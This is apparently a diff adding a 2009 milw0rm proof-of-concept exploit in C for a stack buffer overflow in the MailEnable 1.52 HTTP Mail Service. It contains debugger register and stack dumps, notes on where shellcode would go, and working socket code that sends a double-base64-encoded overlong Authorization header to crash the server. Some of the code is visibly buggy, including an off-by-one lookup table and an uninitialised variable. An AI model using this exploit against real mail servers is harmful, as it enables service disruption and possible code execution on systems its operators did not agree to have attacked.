@@ -1,0 +1,454 @@
+    /*
+    *MailEnable 1.52 HTTP Mail Service Stack Overflow POC Exploit(encoded comand)
+    *Debugging Info
+    *szAppName : MEHTTPS.EXE     szAppVer : 1.0.0.1     szModName : MEHTTPS.EXE     
+    *szModVer : 1.0.0.1     offset : 00010c21
+    *Files that caused error :
+    *C:\DOCUME~1\Stefan\LOCALS~1\Temp\WER567c.dir00\MEHTTPS.EXE.mdmp
+    *C:\DOCUME~1\Stefan\LOCALS~1\Temp\WER567c.dir00\appcompat.txt
+    *
+    *The problem appears when a specialy encoded 64base string is sent to the HTTP Mail Server
+    *ASM instructions
+    *00410C21   8917             MOV DWORD PTR DS:[EDI],EDX
+    *00410C23   83C7 04          ADD EDI,4
+    *00410C26   BA FFFEFE7E      MOV EDX,7EFEFEFF
+    *00410C2B   8B01             MOV EAX,DWORD PTR DS:[ECX]
+    *00410C2D   03D0             ADD EDX,EAX
+    *00410C2F   83F0 FF          XOR EAX,FFFFFFFF
+    *00410C32   33C2             XOR EAX,EDX
+    *00410C34   8B11             MOV EDX,DWORD PTR DS:[ECX]
+    *00410C36   83C1 04          ADD ECX,4
+    *EDX=48545541
+    *DS:[54516FF1]=???
+    *
+    *CPU registers
+    *EAX 70F8FEFE
+    *ECX 004212B8 mehttps.004212B8
+    *EDX 48545541   
+    *EBX 003B2660
+    *ESP 00BB2900
+    *EBP 00BB2E20 ASCII "UATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUATQTEPUDUATEQEPUAT
+    *ESI 003B2660
+    *EDI 54516FF1
+    *EIP 00410C21 mehttps.00410C21
+    *Stack
+    *00BB2D1C   69736142          
+    *00BB2D20   45542063
+    *00BB2D24   55504551
+    *00BB2D28   54515441
+    *00BB2D2C   44555045
+    *00BB2D30   45544155
+    *00BB2D34   55504551
+    *00BB2D38   54515441
+    *00BB2D3C   44555045
+    *00BB2D40   45544155
+    *00BB2D44   55504551
+    *00BB2D48   54515441
+    *00BB2D4C   44555045
+    *00BB2D50   45544155
+    *00BB2D54   55504551
+    *00BB2D58   54515441
+    *00BB2D5C   44555045
+    *00BB2D60   45544155
+    *00BB2D64   55504551
+    *00BB2D68   54515441
+    *00BB2D6C   44555045
+    *00BB2D70   45544155
+    *00BB2D74   55504551
+    *00BB2D78   54515441
+    *00BB2D7C   44555045
+    *00BB2D80   45544155
+    *00BB2D84   55504551
+    *00BB2D88   54515441
+    *00BB2D8C   44555045
+    *00BB2D90   45544155
+    *00BB2D94   55504551
+    *00BB2D98   54515441
+    *00BB2D9C   44555045
+    *00BB2DA0   45544155
+    *00BB2DA4   55504551
+    *00BB2DA8   54515441
+    *00BB2DAC   44555045
+    *00BB2DB0   45544155
+    *00BB2DB4   55504551
+    *00BB2DB8   54515441
+    *00BB2DBC   44555045
+    *00BB2DC0   45544155
+    *00BB2DC4   55504551
+    *00BB2DC8   54515441
+    *00BB2DCC   44555045
+    *00BB2DD0   45544155
+    *00BB2DD4   55504551
+    *00BB2DD8   54515441
+    *00BB2DDC   44555045
+    *00BB2DE0   45544155
+    *00BB2DE4   55504551
+    *00BB2DE8   54515441
+    *00BB2DEC   44555045
+    *00BB2DF0   45544155
+    *00BB2DF4   55504551
+    *00BB2DF8   54515441
+    *00BB2DFC   44555045
+    *00BB2E00   45544155
+    *00BB2E04   55504551
+    *00BB2E08   54515441
+    *00BB2E0C   44555045
+    *00BB2E10   45544155
+    *00BB2E14   55504551
+    *00BB2E18   54515441
+    *00BB2E1C   44555045
+    *00BB2E20   45544155
+    *00BB2E24   55504551
+    *00BB2E28   54515441
+    *00BB2E2C   44555045
+    *00BB2E30   45544155
+    *00BB2E34   55504551
+    *00BB2E38   54515441
+    *00BB2E3C   44555045
+    *00BB2E40   45544155
+    *00BB2E44   55504551
+    *00BB2E48   54515441
+    *00BB2E4C   44555045
+    *00BB2E50   45544155
+    *00BB2E54   55504551
+    *00BB2E58   54515441
+    *00BB2E5C   44555045
+    *00BB2E60   45544155
+    *00BB2E64   55504551
+    *00BB2E68   54515441
+    *00BB2E6C   44555045
+    *00BB2E70   45544155
+    *00BB2E74   55504551
+    *00BB2E78   54515441
+    *00BB2E7C   44555045
+    *00BB2E80   45544155
+    *00BB2E84   55504551
+    *00BB2E88   54515441
+    *00BB2E8C   44555045
+    *00BB2E90   45544155
+    *00BB2E94   55504551
+    *
+    *This is the user controled area ,this is where we have to put the shellcode.
+    *Access violation when writing to 0x54516FF1 ->EDI holds this address.
+    *WARNING it is compiled with cygwin console ,if you run it somewere else
+    *be sure to get the cygwin1.dll in the same folder as the executable.
+    *It will surely work with DEV-cpp 
+    *
+    *DEMO
+    *
+    *C:\Documents and Settings\Stefan\Desktop\Mail Enable-http crash>nn.exe
+    *******************************************************************************
+    MailEnable 1.52 HTTP Mail Service Stack Overflow POC Exploit(encoded comand)
+               Credits:fl0 fl0w
+
+                -h       host HTTP server
+                -p       port HTTP server
+
+    *******************************************************************************
+    ------------------------------------------
+    You can use the following IP addresses
+
+    Host name is .
+    Address 0:192.168.1.2
+    ------------------------------------------
+
+    Host name is .
+    Address 1:79.119.96.127
+    ------------------------------------------
+
+    Host name is .
+    Address 2:192.168.152.1
+    ------------------------------------------
+
+    Host name is .
+    Address 3:192.168.172.1
+    ------------------------------------------
+
+    Usage: nn option host option port
+    C:\Documents and Settings\Stefan\Desktop\Mail Enable-http crash>nn.exe -h 127.0.0.1 -p 8080
+    this program is in the directory /cygdrive/c/Documents and Settings/Stefan/Deskt
+    op/Mail Enable-http crash/
+    - target   127.0.0.1 : 8080
+    - Done
+    */
+    
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <stdint.h>
+    #ifdef WIN32
+    #include <winsock.h>
+    #define close   closesocket
+    #define sleep   Sleep
+    #else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+    #endif
+    #define BUFFSZ      0x2000
+    #define BOF1SZ      0x12C
+    #define BOF2SZ      0x1388
+    #define DEFAULT_PORT 8080
+    #define DEFAULT_HOST "127.0.0.1"
+    /*
+    *Function Protptypes
+    *
+    *
+    */
+    void Menuu(int argc, char **argv)
+    { fprintf(stderr,
+    "\n"
+    "\t-h       host HTTP server\n"
+    "\t-p       port HTTP server\n"
+    "\n"
+    ,
+    argv[0],
+    DEFAULT_PORT,
+    DEFAULT_HOST);
+    }
+
+    int doit(int, char **);
+    uint32_t fletcher32(uint8_t data[BUFFSZ], int16_t len);
+    uint8_t *base64_encode(uint8_t *data, int *size);
+    int putcc(uint8_t *data, int chr, int len);
+    int timeout(int sock, int secs);
+    uint32_t resolv(char *host);
+    /*
+    *End Prototypes
+    */
+    /*
+    * This function gets the PATH of your executable
+    * START PATH
+    */
+    size_t get_executable_path (char* buffer, size_t len)
+    {
+    char* path_end;
+    if (readlink ("/proc/self/exe", buffer, len) <= 0)
+    return -1;
+    path_end = strrchr (buffer, '/');
+    if (path_end == NULL)
+    return -1;
+    ++path_end;
+    *path_end = '\0';
+    return (size_t) (path_end - buffer);
+    }
+    /*
+    *END PATH
+    */
+    void args(int argc, char *argv[])
+    { 
+    int ip;
+    short port;
+    int a;
+    if(a) 
+    while((a = getopt(argc, argv, "h:p")) != EOF) {
+    switch(a)                                     {
+    case 'h':
+    ip = (int)optarg;
+    break;
+    case 'p':
+    port = (int)optarg;
+    break;
+    default:
+    exit(-1);
+                                                   }
+  						                           }
+                                                   }
+    int main(int argc, char *argv[]) {
+    char path[1000];
+    struct  sockaddr_in peer;
+    int     sd,
+           len,
+           attack;
+    uint16_t     port;
+    uint8_t      buff[BUFFSZ],
+           *b64;
+    int a;
+    printf("*******************************************************************************\n");
+    printf("MailEnable 1.52 HTTP Mail Service Stack Overflow POC Exploit(encoded comand)\n");
+    printf("\tCredits:fl0 fl0w\n");
+    Menuu(argc, argv);
+    printf("*******************************************************************************\n");
+    a = doit(argc, argv);             
+    #ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+    #endif
+    setbuf(stdout, NULL);
+    fputs("\n"
+        "\n", stdout);
+    if(argc < 3) {
+        printf("\n"
+        "Usage: %s option host option port\n"
+        "\n", argv[0]);
+        exit(1);
+    }
+    args(argc, argv);
+    if(argc > 3) port = atoi(argv[4]);
+    get_executable_path (path, sizeof (path));
+    printf ("this program is in the directory %s\n", path);
+    peer.sin_addr.s_addr = resolv(argv[2]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
+    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if(sd < 0) exit(0);
+    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))< 0) exit(0);
+    len = BOF1SZ;
+    putcc(buff, 'A', len);
+    b64 = base64_encode(buff, &len);
+    b64 = base64_encode(b64, &len);
+    len = sprintf(buff,"GET / HTTP/1.0\r\n""Authorization: Basic %s\r\n""\r\n", b64);
+    fletcher32(buff,len);    
+    send(sd, buff, len, 0);
+    if(!timeout(sd, 5)) recv(sd, buff, BUFFSZ, 0);
+    close(sd);
+    printf("- done\n");
+    return(0);
+    }
+    /*As you can see the string is real odd looking that is because EBP points to 
+    *a function that filters UPercase caracters  :)  , so you can see in the stack and at
+    *the Registers section.
+    *That may be the fuction that causes the buffer overdflow.
+    *Function mehttps() it is at(offset) ESP + 4 bytes,in other words get the address of
+    *ESP and add 4 bytes that is it's possition in the stack. 
+    *The call stack is 
+    *00BB2904   0040BC9A  RETURN to mehttps.0040BC9A from mehttps.00410B90
+    /*
+    * ENCODE STRINGS
+    */
+    /*
+    *The algorithm for encoding in 64base was 
+    *inspired from a code of Aluigi Arena so thnx man !
+    */
+    uint8_t *base64_encode(uint8_t *data, int *size) {
+    int     len,
+    a,
+    b,
+    c;
+    uint8_t      *buff,
+            *p;
+    uint8_t base[64];
+    base[1] = 0x41;  base[7] = 0x47;  base[13] = 0x4D; base[19] = 0x53; base[25] = 0x59;  
+    base[2] = 0x42;  base[8] = 0x48;  base[14] = 0x4E; base[20] = 0x54; base[26] = 0x5A;
+    base[3] = 0x43;  base[9] = 0x49;  base[15] = 0x4F; base[21] = 0x55;
+    base[4] = 0x44;  base[10] = 0x4A; base[16] = 0x50; base[22] = 0x56;
+    base[5] = 0x45;  base[11] = 0x4B; base[17] = 0x51; base[23] = 0x57;
+    base[6] = 0x46;  base[12] = 0x4C; base[18] = 0x52; base[24] = 0x58; //A->Z
+    base[27] = 0x61;  base[28] = 0x62;  base[29] = 0x63; base[30] = 0x64; base[31] = 0x65;  
+    base[32] = 0x66;  base[33] = 0x67;  base[34] = 0x68; base[35] = 0x69; base[36] = 0x6A;
+    base[37] = 0x6B;  base[38] = 0x6C;  base[39] = 0x6D; base[40] = 0x6F;
+    base[41] = 0x70;  base[42] = 0x71; base[43] = 0x72; base[44] = 0x73;
+    base[45] = 0x74;  base[46] = 0x75; base[47] = 0x76; base[48] = 0x77;
+    base[49] = 0x78;  base[50] = 0x79; base[51] = 0x7A; base[52] = 0x30;
+    base[53] = 0x31;  base[54] = 0x32; base[55] = 0x33; base[56] = 0x34; //a->z
+    base[57] = 0x35; base[58] = 0x36; base[59] = 0x37; base[60] = 0x38; 
+    base[61] = 0x39; base[62] = 0x2B; base[63] = 0x2C; base[64] = 0x2F;
+    if(!size || (*size < 0)) {      
+        len = strlen(data);
+    } else {
+        len = *size;
+    }
+    buff = malloc(((len / 3) << 2) + 6);
+    if(!buff) return(NULL);
+    p = buff;
+    do {
+    a = data[0];
+    b = data[1];
+    c = data[2];
+    *p++ = base[(a >> 2) & 63];
+    *p++ = base[(((a &  3) << 4) | ((b >> 4) & 15)) & 63];
+    *p++ = base[(((b & 15) << 2) | ((c >> 6) &  3)) & 63];
+    *p++ = base[c & 63];
+    data += 3;
+    len  -= 3;
+    } while(len > 0);
+    *p = 0;
+    for(; len < 0; len++) *(p + len) = '=';
+    if(size) *size = p - buff;
+    return(buff);
+    }
+    /*
+    *
+    *
+    *EDX is controled 
+    *EBP holds the long string that is encoded in base64.
+    *Stack starts at address 0x00BB2900 ,at that address there is a DWORD NULLBYTE.
+    *The stack overflow starts at the address 0x00BB2D1C   
+    */
+    int putcc(uint8_t *data, int chr, int len) {
+    memset(data, chr, len);
+    return(len);
+    }
+    int timeout(int sock, int secs) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    tout.tv_sec  = secs;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    if(select(sock + 1, &fd_read, NULL, NULL, &tout) <= 0) return(-1);
+    return(0);
+    }
+    uint32_t resolv(char *host) {
+    struct  hostent *hp;
+    uint32_t     host_ip;
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+    hp = gethostbyname(host);
+    if(!hp) {
+    printf("\nError: Unable to resolv hostname (%s)\n", host);
+    exit(1);
+    } else host_ip = *(uint32_t *)hp->h_addr;
+    }
+    return(host_ip);
+    }
+    uint32_t fletcher32(uint8_t data[BUFFSZ], int16_t len)
+    {
+    uint32_t sum1 = 0xffff, sum2 = 0xffff;
+    while (len) {
+    unsigned tlen = len > 360 ? 360 : len;
+    len -= tlen;
+    do {
+    sum1 += *data++;
+    sum2 += sum1;
+    } while (--tlen);
+    sum1 = (sum1 & 0xffff) + (sum1 >> 16);
+    sum2 = (sum2 & 0xffff) + (sum2 >> 16);
+    }
+    sum1 = (sum1 & 0xffff) + (sum1 >> 16);
+    sum2 = (sum2 & 0xffff) + (sum2 >> 16);
+    return sum2 << 16 | sum1;
+    }
+    int doit(int a, char **b)
+    {
+    char ac[80];
+    int i;
+    #ifdef WIN32
+    if (gethostname(ac, sizeof(ac)) == SOCKET_ERROR) {
+    printf("Error " ,WSAGetLastError());
+    return 1;
+                                                     }
+    #endif                                                     
+    struct hostent *phe = gethostbyname(ac);
+    if (phe == 0) {
+    printf("Bad host lookup.\n");
+    return 1;
+    }
+    printf("------------------------------------------\n");
+    printf("You can use the following IP addresses\n");
+    for (i = 0; phe->h_addr_list[i] != 0; ++i) {
+    struct in_addr addr;
+    memcpy(&addr, phe->h_addr_list[i], sizeof(struct in_addr));
+    printf("\n");
+    printf("Host name is %s.\n" ,ac);
+    printf("Address %d:%s\n" ,i ,inet_ntoa(addr));
+    printf("------------------------------------------\n");
+    }
+    return 0;
+    }
+
+// milw0rm.com [2009-08-31]
